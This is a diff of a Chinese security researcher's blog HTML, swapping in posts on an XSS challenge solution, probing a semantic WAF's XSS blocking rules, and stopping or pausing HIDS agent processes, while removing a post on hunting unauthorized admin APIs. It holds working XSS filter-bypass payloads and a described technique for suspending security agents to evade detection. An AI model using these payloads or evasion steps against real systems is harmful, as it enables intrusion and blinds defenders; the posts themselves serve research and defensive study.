+<p>第一个问题简单一点：在发生类型转换时，会执行valueOf或者toString属性值指向的函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1-&#123;valueOf:function()&#123;alert(1)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二个问题难一点，需要对this的用法比较熟悉。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在函数外部,this指向window对象</span><br><span class="line"></span><br><span class="line">在函数内部：</span><br><span class="line"></span><br><span class="line">* 普通调用时</span><br><span class="line">  * strict模式下，this指向undeined</span><br><span class="line">  * 非strict模式下，this指向当前对象</span><br></pre></td></tr></table></figure>
+
+<p>还有一些方式改变this指向的对象，包括：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 调用call函数、apply函数等指定对象</span><br><span class="line">* new构造函数</span><br></pre></td></tr></table></figure>
+
+<p>this涉及的情况比较多，也比较反直觉，这里就不多说了。可以看 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/113399">11 | this：从JavaScript执行上下文的视角讲清楚this</a> 这篇文章。</p>
+<h1 id="题目解法"><a href="#题目解法" class="headerlink" title="题目解法"></a>题目解法</h1><p>我的解法和 @rmb122 师傅一样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;xx%27-&#123;valueOf:test.a,%27call%27:%22%27%22%2blocation.hash&#125;-%27#&#39;;hello(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>我也把题目发给我做前端开发的朋友，他的解法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;%27%2B&#123;toString:%20test.a,call:%20%27hello%27%2B[...hello%2B%27%27][29]%2B%22%27a%27,%22%2B%22%27b%27,%22%2B%22%27c%27%22%2B[...hello%2B%27%27][56]&#125;%2B%27</span><br></pre></td></tr></table></figure>
+
+<p>中间有个小插曲：在朋友把他的解法发我后，我在代码中添加了对[]符号的过滤，因为我碰到的实际案例中也过滤了[]符号。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然当时绕过了xss的过滤，也清楚触发流程，但是我不明白为什么会这么触发。</p>
+<p>所以补了一下和此题相关的语法及概念，包括以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 类型转换</span><br><span class="line">* this是什么</span><br><span class="line">* 函数是一等公民</span><br></pre></td></tr></table></figure>
+
+<p>由这个问题想到，是否其他语言有类似场景？比如某个对象可控时，对它做运算会导致函数调用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj &#x3D; &#123;&quot;可控key&quot;:&quot;可控value&quot;&#125;</span><br><span class="line"></span><br><span class="line">操作 obj</span><br></pre></td></tr></table></figure>
+
+<p>这是一个木有答案的问题。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
 
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
-<li>“结束进程”需要考虑到”进程挂掉重启”的场景</li>
-<li>“暂停进程”需要考虑到”父进程恢复进程状态”的场景</li>
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(1)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(1)/" class="post-title-link" itemprop="url">细品某语义waf的xss防护(1)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>假设攻击场景如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xss漏洞输出位置如下:</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;用户输出可控位置&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">攻击者准备利用on事件来执行js,比如</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;&lt;svg onload&#x3D;&quot;alert(&#39;xss&#39;);&quot;&gt;&lt;&#x2F;div&gt;   利用onload属性</span><br></pre></td></tr></table></figure>
+
+<p>验证在这个场景下厂商的安全防护策略</p>
+<p>分析思路：</p>
+<ol>
+<li>改变payload，根据拦截情况推测安全防护策略</li>
+</ol>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;  不拦截</span><br><span class="line">a&#x3D;&lt;img&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;  拦截</span><br></pre></td></tr></table></figure>
+<p>说明区分了认识的标签和不认识的标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;a&#x3D;&lt;div&#x2F;oxx&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;&#39;    不拦截</span><br><span class="line">&#39;a&#x3D;&lt;div&#x2F;onxx&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;&#39;   拦截</span><br></pre></td></tr></table></figure>
+<p>拦截on事件，只要以on开头就拦截</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa(&#39;&#39;;&quot;&gt;   on属性值中少一个右括号就不拦截，说明判断js语法是否正确</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa(&#39;&#39;);&quot;&gt;   拦截</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa;&quot;&gt;   不拦截</span><br></pre></td></tr></table></figure>
+<p>未知标签 &amp;&amp; on事件 &amp;&amp; 解析on属性中js &amp;&amp; on属性中调用了函数   则拦截</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onxxx&#x3D;a();&gt;     不拦截</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onxxx&#x3D;xxxxx;a();&gt;   拦截</span><br></pre></td></tr></table></figure>
+<p>on属性值需要大于一定长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;img&#x2F;onxxxx&#x3D;&quot;aaa&quot;&gt;  不拦截</span><br><span class="line"></span><br><span class="line">a&#x3D;&lt;img&#x2F;onxxxx&#x3D;&quot;aaaaaaa&quot;&gt;   拦截</span><br></pre></td></tr></table></figure>
+<p>已知标签on属性值大于一定长度则拦截</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>存在HTML解析和JS解析</p>
+<p>安全防护策略可能是：</p>
+<ul>
+<li>HTML解析 &amp;&amp; 未知标签 &amp;&amp; on事件 &amp;&amp; on属性值大于一定长度 &amp;&amp; 对on属性值做JS解析 &amp;&amp; on属性中调用了函数   则拦截</li>
+<li>HTML解析 &amp;&amp; 已知标签 &amp;&amp; on事件 &amp;&amp; on属性值大于一定长度  则拦截</li>
 </ul>
-<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
 
       
     </div>
@@ -1086,7 +890,7 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%80%EF%BC%89/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E7%BB%93%E6%9D%9F%E5%92%8C%E6%9A%82%E5%81%9Cagent%E8%BF%9B%E7%A8%8B/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1099,7 +903,7 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">安全建设-攻防思路及实践（一）</a>
+          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E7%BB%93%E6%9D%9F%E5%92%8C%E6%9A%82%E5%81%9Cagent%E8%BF%9B%E7%A8%8B/" class="post-title-link" itemprop="url">如何结束和暂停agent进程</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1123,84 +927,86 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>以前挖国内src时的一个套路：</p>
-<p>通过”寻找管理后台 + 寻找api接口 + burp验证api接口”来找未授权api</p>
-<p>找到未授权api后，根据api功能就能造成不同危害：</p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>就像 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WQeOfZtyKndbDebe66-V_g">如何避免文件上报-制作大文件</a> 说的，hids agent会上报很多信息，安全防护策略也是围绕”agent上报的信息”制定的。</p>
+<p>那如果攻击者”结束、暂停agent进程”，导致agent功能废掉，是不是就能够绕过hids的防护呢？</p>
+<p>研究过程中，我发现并不能轻易地结束agent进程；”结束和暂停agent进程”会带来”心跳失联”的异常特征，可能引起”运营人员”的注意从而导致攻击行为暴露。</p>
+<p>本文主要讨论以下问题：</p>
 <ul>
-<li>比如利用”重置密码接口”来重置管理员密码，然后登陆后台</li>
-<li>比如利用”查数据接口”获取数据</li>
+<li>怎么结束agent进程？</li>
+<li>怎么暂停agent进程？</li>
+<li>“心跳失联”</li>
 </ul>
-<p>个人觉得这个套路比较好用，原因在于：</p>
+<h1 id="结束agent进程"><a href="#结束agent进程" class="headerlink" title="结束agent进程"></a>结束agent进程</h1><ul>
+<li><p>怎么结束agent进程？</p>
+<p>在linux上执行 <code>kill -SIGKILL 进程号</code> 是一定可以结束进程的，因为 SIGKILL信号不能被忽略或者做其他处理。</p>
+<p>但是我们杀掉hids agent进程后，agent进程会自动重启。</p>
+</li>
+<li><p>怎么实现”挂掉自动重启”？</p>
+<p>经过调研，”挂掉自动重启”机制在linux最常见的实现方式包括：</p>
+<blockquote>
+<p>通过 systemd、supervisord 等实现</p>
+<p>crond：通过计划任务</p>
+<p>watchdog</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/blob/main/server/docs/quick-start-zh_CN.md">字节hids文档</a> 推荐的也是”systemd”和”crond”这两种方式。</p>
+<p><img src="https://images.gitee.com/uploads/images/2021/0923/234007_74229bc1_83508.png" alt="字节hids文档" title="屏幕截图.png"></p>
+<p>有对supervisord、systemd实现原理感兴趣的，可以看最后一节。</p>
+</li>
+<li><p>怎么结束被systemd、supervisord管理的进程？</p>
+<p>supervisord和systemd等管理的进程可以通过”supervisorctl”和”systemctl”等命令关掉。</p>
+<p>这两命令实际也是通过”本地socket通信”告诉supervisord和systemd结束进程，所以当没有办法使用”supervisorctl”和”systemctl”命令时，也可以编写程序直接和”本地socket文件”通信。</p>
+</li>
+</ul>
+<h1 id="暂停agent进程"><a href="#暂停agent进程" class="headerlink" title="暂停agent进程"></a>暂停agent进程</h1><ul>
+<li><p>怎么暂停agent进程？</p>
+<p>向进程发送SIGSTOP、SIGTSTP、SIGTTIN等信号都可能暂停进程，推荐用SIGSTOP信号，原因是进程收到其他信号还能忽略，收到SIGSTOP信号却只能暂停进程。</p>
+<p>这个结论可以在<code>man 7 signal</code>看到</p>
+<blockquote>
+<p>The signals SIGKILL and SIGSTOP cannot be caught, blocked, or ignored.</p>
+</blockquote>
+</li>
+</ul>
 <ul>
-<li>没有攻击payload，waf、nids等安全设备比较难检测（虽然可能按照访问404频率和比例等特征封禁）</li>
-<li>“管理后台对外开放”和”api接口未授权访问”，个人感觉这两个风险在企业里很难靠”技术手段”完全杜绝</li>
-<li>大部分检测工作可以用工具完成</li>
+<li><p>“暂停的agent进程”是否会被自动重启或者恢复运行状态？</p>
+<p>这里还存在一个小问题：当子进程被暂停或者结束时，父进程是可以收到SIGCHLD信号的。那systemd遇到子进程暂停时，会不会重启进程？</p>
+<p>经过测试和源码对比，我的结论是：systemd不会。</p>
+</li>
+<li><p>测试某hids</p>
+<p>经过对某hids做测试，发现stop状态的agent进程会被恢复成运行状态。</p>
+<p>agent进程的父进程的父进程才是systemd，所以估计是agent父进程收到SIGCHLD信号后向agent进程发送了SIGCONT信号恢复运行状态。</p>
+<p>当把hids所有的agent进程都暂停后，符合预期：所有agent进程一直被暂停。</p>
+</li>
 </ul>
-<p>也有不好的地方，在于：</p>
+<h1 id="“心跳失联”的问题"><a href="#“心跳失联”的问题" class="headerlink" title="“心跳失联”的问题"></a>“心跳失联”的问题</h1><ul>
+<li><p>“心跳失联”是什么？</p>
+<p>正常情况下，agent按照一定频率会发送”心跳包”告诉server自己存活。</p>
+<p>如果”结束和暂停agent进程”，就会影响到”心跳包”的发送。进而server端是可以感知到agent异常的。</p>
+<p>这种异常可能引起”运营人员”的注意从而导致攻击行为暴露。</p>
+</li>
+<li><p>怎么解决”心跳失联”的问题？</p>
+<p>凭空想象的一种解决方法：恶意样本 先暂停agent进程，等到恶意行为完成后，再恢复agent进程。</p>
+<p>这样心跳也存在，也有可能绕过hids防护。</p>
+</li>
+</ul>
+<h1 id="systemd是怎么知道”进程挂掉”？"><a href="#systemd是怎么知道”进程挂掉”？" class="headerlink" title="systemd是怎么知道”进程挂掉”？"></a>systemd是怎么知道”进程挂掉”？</h1><p>先说我验证的结论：</p>
 <ul>
-<li>整个流程没有完全自动化，需要人工做重复性的事情，比如判断是否是管理后台</li>
+<li>systemd为sigchild信号注册了一个处理函数，函数内部调用waitid处理退出的子进程。</li>
+<li>当systemd管理的进程退出时，systemd进程会收到sigchild信号，进而跳转到处理函数。</li>
 </ul>
-<h1 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h1><ul>
-<li><p>怎么找”管理后台”？</p>
-<p>大概分三步：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 第一步筛出可能的管理后台地址</span><br><span class="line">* 第二步将首页截图保存成本地</span><br><span class="line">* 第三步人工浏览截图</span><br></pre></td></tr></table></figure>
+<p>从<a target="_blank" rel="noopener" href="https://github.com/systemd/systemd/blob/71a80dcc0b64b01c73e7141c4292ef301543a011/src/core/manager.c">systemd源码</a>可以看到manager_setup_sigchld_event_source函数就是”sigchild信号的处理函数”。<br><img src="https://images.gitee.com/uploads/images/2021/0923/234046_4aa2c450_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
+<p>如果systemd进程号为1，也可以通过<code>strace -p 1</code>来验证结论：</p>
+<p>结束systemd管理的进程时（下面例子中是83206号进程），可以看到waitid系统调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">waitid(P_ALL, 0, &#123;si_signo&#x3D;SIGCHLD, si_code&#x3D;CLD_KILLED, si_pid&#x3D;83206, si_uid&#x3D;0, si_status&#x3D;SIGKILL, si_utime&#x3D;0, si_stime&#x3D;0&#125;, WNOHANG|WEXITED|WNOWAIT, NULL) &#x3D; 0</span><br><span class="line">...</span><br><span class="line">waitid(P_PID, 83206, &#123;si_signo&#x3D;SIGCHLD, si_code&#x3D;CLD_KILLED, si_pid&#x3D;83206, si_uid&#x3D;0, si_status&#x3D;SIGKILL, si_utime&#x3D;0, si_stime&#x3D;0&#125;, WEXITED, NULL) &#x3D; 0</span><br><span class="line">waitid(P_ALL, 0, &#123;&#125;, WNOHANG|WEXITED|WNOWAIT, NULL) &#x3D; 0</span><br></pre></td></tr></table></figure>
 
-<p>第一步筛选管理后台地址的策略包括：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 域名中包含关键词，直接当作后台管理系统</span><br><span class="line">* 30x跳转地址包含关键词</span><br><span class="line">* 响应html中包含table标签（因为有可能后台管理首页就存在未授权访问，数据展示时会用到table标签）</span><br><span class="line">* 判断页面是否是vue框架写的（因为很多开发喜欢选择用vue来做管理系统）</span><br></pre></td></tr></table></figure>
+<p>supervisord和systemd有点类似，不一样的是supervisord似乎只用wait等系统调用，来判断子进程是否已经退出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ps aux|grep supervi</span><br><span class="line">root     13170  0.0  0.0  56368 12760 ?        Ss   6月01  71:47 &#x2F;usr&#x2F;bin&#x2F;python &#x2F;usr&#x2F;bin&#x2F;supervisord -c &#x2F;data&#x2F;poc-web-api&#x2F;docker&#x2F;supervisor.conf</span><br><span class="line">[root@instance-fj5pftdp ~]# strace -p 13170 2&gt;&amp;1 | grep -i wait</span><br><span class="line">...</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, [&#123;WIFSIGNALED(s) &amp;&amp; WTERMSIG(s) &#x3D;&#x3D; SIGKILL&#125;], WNOHANG, NULL) &#x3D; 5557</span><br></pre></td></tr></table></figure>
 
-<p>脚本片段：<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/334b719e253261ffd0abfd161e499ae7">https://gist.github.com/leveryd/334b719e253261ffd0abfd161e499ae7</a></p>
-</li>
-<li><p>怎么找api接口？</p>
-<p>从js文件文本中找，策略如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 将js代码中字符串常量提取出来</span><br><span class="line">* 字符串常量匹配 &#96;&#x2F;[\w\d\-.&#x2F;]+&#96; 且不以 &#x2F;&#x2F; 字符开头，认为是api路径</span><br><span class="line">* 字符串常量匹配 &#96;[\w\d\-]+&#x2F;[\w\d\-.&#x2F;]+&#96; 且不以 &#x2F; 字符开头，认为是api路径</span><br></pre></td></tr></table></figure>
 
-<p>脚本片段：<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/465d19610d5fcf99199beb9284cd6f8c">https://gist.github.com/leveryd/465d19610d5fcf99199beb9284cd6f8c</a></p>
-<p>这种方式不需要前端存在sourcemap泄漏。</p>
-<p>当然如果前端有sourcemap信息就更好，这样可以利用 <a target="_blank" rel="noopener" href="https://github.com/SunHuawei/SourceDetector">利用sourcemap还原前端项目-浏览器插件</a> 这种工具还原前端项目，代码阅读性更好一些。接着对前端项目做代码审计，有可能在前端代码中看到 啥token、啥功能比较特殊的api接口（比如上传文件）。</p>
-</li>
-<li><p>怎么使用burpsuite验证api接口？</p>
-<p>将找到的api接口放到burpsuite批量验证，根据 响应状态码、响应长度、响应内容 来判断是否有未授权的api接口。</p>
-<p>测试过程中可以变换请求方法：GET、POST、PUT</p>
-<p>确认存在未授权接口后，再人工从前端js中找参数值利用。</p>
-</li>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>“结束进程”需要考虑到”进程挂掉重启”的场景</li>
+<li>“暂停进程”需要考虑到”父进程恢复进程状态”的场景</li>
 </ul>
-<h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><ul>
-<li>[评级高危-顺丰某系统后台API接口未做认证导致用户信息泄漏]</li>
-<li>[评级高危-顺丰某系统未授权导致获取后台管理权限，可查看大量订单信息]</li>
-<li>[评级高危-字节某业务线后端接口未授权访问]</li>
-<li>[评级中危-腾讯广告后台接口未认证]</li>
-<li>[评级低危-后台API接口存在未授权访问(可增删改数据)]</li>
-</ul>
-<h1 id="安全管理与技术"><a href="#安全管理与技术" class="headerlink" title="安全管理与技术"></a>安全管理与技术</h1><p>对于”管理后台对外开放”和”api接口未授权访问”这两类风险，在企业安全建设中是怎么防范的呢？</p>
-<ul>
-<li><p>怎么减少”管理后台对外”安全风险？</p>
-<p>根据个人有限的经验来总结，管理上包括如下手段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 公司发布安全红线：禁止后台开放到公网访问</span><br><span class="line">* 安全意识的宣导</span><br></pre></td></tr></table></figure>
-
-<p>技术上包括如下手段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 统一认证登陆</span><br><span class="line">* 周期性对资产做扫描，识别&quot;管理后台&quot;</span><br><span class="line">* 从流量层面识别&quot;管理后台&quot;</span><br></pre></td></tr></table></figure>
-
-<p>业务上包括如下手段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 后台访问白名单限制</span><br><span class="line">* 后台登陆多因素认证MFA（短信二次认证、rsa token等）</span><br></pre></td></tr></table></figure>
-
-<p>比如能看到的，滴滴很多后台管理业务都接入了统一认证登陆，对于我来说就比较难进一步测试。</p>
-<p>不过上面的手段都并不一定管用，各种手段自身也有设计缺陷、安全漏洞等。</p>
-<p>比如我前公司的统一认证平台 <a target="_blank" rel="noopener" href="https://passport.fangdd.com/public/login?url=https://passport.fangdd.com/password/resetingPage.do;jsessionid=88F109354741F07D5ED2004B1BB5E35C-n1">统一认证登陆</a> 出现过一个设计上的漏洞。</p>
-<p>正常的业务场景是：它支持钉钉登陆，员工在web页面输入邮箱后，钉钉app会收到一个确认登陆链接。员工点击确认链接后，web端就会验证通过，进入到后台系统。</p>
-<p>有白帽子收集一些部分员工邮箱，就在web页面填收集到的邮箱。结果有部分员工点击了钉钉上收到的”确认登陆链接”消息，帮助”攻击者”进到了后台系统。</p>
-<p>另外还听我同事给我分享的案例，他遇到某些有多因子认证的系统时，加x-forwarded-for请求头伪造内网ip就绕过去了，原因是面向内部的系统去掉了”多因子认证”。</p>
-<p>至于安全意识的宣导、安全红线到底有多大作用，这感觉更不好衡量。</p>
-</li>
-<li><p>怎么减少”api接口未授权访问”安全风险？</p>
-<p>根据个人有限的经验来总结，技术上包括以下手段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 依赖开发人员的代码安全质量</span><br><span class="line">* 零信任架构的实施</span><br></pre></td></tr></table></figure>
-
-<p>零信任应用的两个场景包括了 用户访问服务 和 服务之间互相访问 时的认证鉴权，而”用户登陆后台访问数据”恰好就是”用户访问服务”这个场景。</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>验证了这个老套路在国内还是能挖到洞的。</p>
-<p>站在攻击方的角度来看，现有每一步的安全策略可以优化，比如可以详细调研一下后台系统的分类，比如为什么开源的cms后台和前台经常是在一个域名下，而企业里的后台系统为什么经常是单独的访问方式？</p>
-<p>整个流程或许也可以优化到完全依赖工具产出报警，就像 <a target="_blank" rel="noopener" href="https://www.hackinn.com/index.php/archives/744/">一种针对Webpack等前端打包工具构建的网站的自动化测试思路（附开源项目）</a> 一样。虽然没有用过这个项目，但是看文章介绍感觉有不少实战上的细节和经验。</p>
+<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
 
       
     </div>
@@ -1227,7 +1033,7 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E6%8A%A5-%E5%88%B6%E4%BD%9C%E5%A4%A7%E6%96%87%E4%BB%B6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1240,7 +1046,7 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE-%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">安全建设-攻防思路及实践（二）</a>
+          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E6%8A%A5-%E5%88%B6%E4%BD%9C%E5%A4%A7%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">如何避免文件上报-制作大文件</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1264,51 +1070,96 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>有一个挖src的老套路：”.git目录”信息泄漏 + 人工代码审计。</p>
-<p>当网站可以访问”.git/index”时，可以用<a target="_blank" rel="noopener" href="http://www.lijiejie.com/githack-a-git-disclosure-exploit/">GitHack — 一个git泄露利用脚本</a>工具还原整个项目工程。然后对源码做代码审计，尝试挖掘漏洞。</p>
